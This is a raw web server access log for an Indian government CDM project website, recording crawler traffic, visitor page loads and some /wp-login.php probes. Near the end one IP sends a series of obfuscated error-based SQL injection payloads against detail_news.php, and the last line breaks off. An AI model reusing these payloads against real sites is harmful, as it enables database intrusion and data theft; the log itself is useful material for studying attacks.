157.55.39.156 - - [10/Jun/2017:02:05:01 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.131 - - [10/Jun/2017:02:06:11 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=87 HTTP/1.1" 200 22000 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.190.240.37 - - [10/Jun/2017:02:07:18 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.190.240.37 - - [10/Jun/2017:02:07:18 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.19 - - [10/Jun/2017:02:09:21 +0530] "GET /project_details_view.php?id=924 HTTP/1.1" 200 15882 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
106.79.49.210 - - [10/Jun/2017:02:10:03 +0530] "GET /project_details_view_report.php?id=957 HTTP/1.1" 200 13176 "http://www.google.co.in/search?hl=en&redir_esc=&client=ms-android-google&source=android-search-app&v=133247963&qsubts=1497040740141&q=badyar+pawar+plant+barkot+uttarkashi&v=133247963" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:05 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:06 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:09 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:12 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:10 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:11 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:16 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:19 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:19 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:20 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:20 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:21 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:21 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
106.79.49.210 - - [10/Jun/2017:02:10:29 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "http://www.cdmindia.gov.in/project_details_view_report.php?id=957" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; FlairE3 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
66.249.79.129 - - [10/Jun/2017:02:11:17 +0530] "GET /news_more.php HTTP/1.1" 200 21063 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [10/Jun/2017:02:11:22 +0530] "GET /Approved_proj_reports_list_details.php?id=&reporttype=&scale=&sdt=&edt=vqwielkp&exec=&page=20 HTTP/1.1" 200 17304 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [10/Jun/2017:02:14:35 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.133 - - [10/Jun/2017:02:16:31 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=115 HTTP/1.1" 200 21971 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.254.38.193 - - [10/Jun/2017:02:18:45 +0530] "GET /approval_process.php HTTP/1.0" 200 25914 "http://cdmindia.gov.in/approval_process.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
109.254.38.193 - - [10/Jun/2017:02:18:46 +0530] "GET /registration.php HTTP/1.0" 200 28531 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
109.254.38.193 - - [10/Jun/2017:02:18:46 +0530] "GET /registration.php HTTP/1.0" 200 28531 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
109.254.38.193 - - [10/Jun/2017:02:18:47 +0530] "GET /registration.php HTTP/1.0" 200 28531 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
109.254.38.193 - - [10/Jun/2017:02:18:48 +0530] "GET /registration.php HTTP/1.0" 200 28531 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
68.180.228.167 - - [10/Jun/2017:02:19:38 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
66.249.79.129 - - [10/Jun/2017:02:21:42 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=230 HTTP/1.1" 200 22128 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [10/Jun/2017:02:22:40 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
68.180.228.167 - - [10/Jun/2017:02:23:58 +0530] "GET /imp_links.php HTTP/1.1" 200 17836 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
199.30.24.164 - - [10/Jun/2017:02:24:10 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.24.164 - - [10/Jun/2017:02:24:12 +0530] "GET /images/login1.jpg HTTP/1.1" 200 618 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.24.164 - - [10/Jun/2017:02:24:12 +0530] "GET /images/bullet3.gif HTTP/1.1" 200 58 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.24.164 - - [10/Jun/2017:02:24:13 +0530] "GET /images/fe.jpg HTTP/1.1" 200 1429 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.24.164 - - [10/Jun/2017:02:24:14 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
66.249.79.131 - - [10/Jun/2017:02:26:52 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=198 HTTP/1.1" 200 22151 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.167.104.82 - - [10/Jun/2017:02:28:46 +0530] "GET /project_details_view.php?id=930 HTTP/1.1" 200 16546 "http://www.google.co.in/search?q=rekangpeo+pooh+hydro+project&btnG=&client=ms-opera-mini-android&channel=new&hl=en" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:46 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:46 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
107.167.104.82 - - [10/Jun/2017:02:28:47 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Opera/9.80 (Android; Opera Mini/26.0.2254/64.199; U; en) Presto/2.12.423 Version/12.16"
35.184.189.105 - - [10/Jun/2017:02:28:48 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.131 - - [10/Jun/2017:02:31:52 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.156 - - [10/Jun/2017:02:34:51 +0530] "GET /js/md5.js HTTP/1.1" 200 13194 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:02:34:55 +0530] "GET /js/base64_encode.js HTTP/1.1" 200 3002 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.133 - - [10/Jun/2017:02:36:53 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=210 HTTP/1.1" 200 21993 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [10/Jun/2017:02:38:12 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.131 - - [10/Jun/2017:02:41:55 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=186 HTTP/1.1" 200 22059 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.16 - - [10/Jun/2017:02:42:05 +0530] "GET /project_details_view.php?id=1754 HTTP/1.1" 200 15027 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
92.133.43.188 - - [10/Jun/2017:02:43:09 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Java/1.8.0_101"
157.55.39.156 - - [10/Jun/2017:02:44:14 +0530] "GET /detail_news.php?id=17 HTTP/1.1" 302 18572 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [10/Jun/2017:02:44:14 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [10/Jun/2017:02:44:15 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
37.47.45.220 - - [10/Jun/2017:02:45:46 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.47.45.220 - - [10/Jun/2017:02:45:47 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.79.133 - - [10/Jun/2017:02:46:52 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=260 HTTP/1.1" 200 22390 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.129 - - [10/Jun/2017:02:46:53 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=246 HTTP/1.1" 200 22139 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.171.183.14 - - [10/Jun/2017:02:51:25 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.171.183.14 - - [10/Jun/2017:02:51:25 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.79.133 - - [10/Jun/2017:02:51:51 +0530] "GET /registration.php HTTP/1.1" 302 28531 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [10/Jun/2017:02:51:52 +0530] "GET /project_details_view.php?id=93 HTTP/1.1" 200 14102 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [10/Jun/2017:02:51:53 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.133 - - [10/Jun/2017:02:51:54 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.173.165.103 - - [10/Jun/2017:02:53:04 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring"
74.208.124.190 - - [10/Jun/2017:02:54:30 +0530] "POST /detail_news.php?id='0=A HTTP/1.1" 200 11732 "http://www.cdmindia.gov.in/detail_news.php?id='0=A" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:02:54:30 +0530] "POST /detail_news.php?id=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a) HTTP/1.1" 200 18056 "http://www.cdmindia.gov.in/detail_news.php?id=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
40.77.167.85 - - [10/Jun/2017:02:55:44 +0530] "GET /project_details_view_report.php?id=29 HTTP/1.1" 200 13125 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.131 - - [10/Jun/2017:02:56:52 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=20 HTTP/1.1" 200 22121 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.53.195 - - [10/Jun/2017:02:58:27 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
74.208.124.190 - - [10/Jun/2017:02:58:35 +0530] "POST /detail_news.php?id=3%22(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+%22 HTTP/1.1" 200 18399 "http://www.cdmindia.gov.in/detail_news.php?id=3\"(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+\"" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:02:58:38 +0530] "POST /detail_news.php?id=3%22+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+%221%22=%221 HTTP/1.1" 200 18399 "http://www.cdmindia.gov.in/detail_news.php?id=3\"+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+\"1\"=\"1" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:02:59:10 +0530] "POST /detail_news.php?id=3%22+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+%221%22=%221 HTTP/1.1" 200 18399 "http://www.cdmindia.gov.in/detail_news.php?id=3\"+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+\"1\"=\"1" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
74.208.124.190 - - [10/Jun/2017:02:59:12 +0530] "POST /detail_news.php?id=3'+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)-- HTTP/1.1" 200 11729 